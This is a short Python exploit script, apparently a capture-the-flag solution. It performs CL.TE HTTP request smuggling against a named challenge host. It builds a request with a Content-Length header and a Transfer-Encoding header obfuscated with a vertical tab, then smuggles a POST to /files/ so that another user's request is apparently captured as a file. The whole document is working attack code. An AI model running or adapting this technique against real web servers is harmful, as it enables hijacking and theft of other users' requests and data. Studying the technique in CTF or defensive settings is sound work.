#!/usr/bin/env python3
import socket
import ssl
import sys


CLTE_TEMPLATE = """GET / HTTP/1.1
Host: localhost
User-Agent: attacker
Content-Length: {length}
Transfer-Encoding:\x0bchunked

0

"""

HOSTNAME = "uploooadit.oooverflow.io"


def request(content, hostname=HOSTNAME, port=443):
    print(content)
    print()

    context = ssl.create_default_context()
    with socket.create_connection((hostname, port)) as raw_socket:
        with context.wrap_socket(raw_socket, server_hostname=hostname) as server:
            assert server.send(content) == len(content)
            data = server.recv(1024)
            while len(data) > 0:
                print(data.decode("utf-8"))
                data = server.recv(1024)
        try:
            raw_socket.shutdown(socket.SHUT_RDWR)
        except:
            pass


def clte(payload):
    offset = 5 + payload.count("\n")
    return (
        (CLTE_TEMPLATE.format(length=len(payload) + offset) + payload)
        .replace("\n", "\r\n")
        .encode("utf-8")
    )


def main():
    payload = """POST /files/ HTTP/1.1
Connection: close
Content-Length: 358
Content-Type: text/plain
User-Agent: hacked
X-guid: aa7e4586-d547-4a4a-a088-fc208a437a6c

"""

    request(clte(payload))


if __name__ == "__main__":
    sys.exit(main())
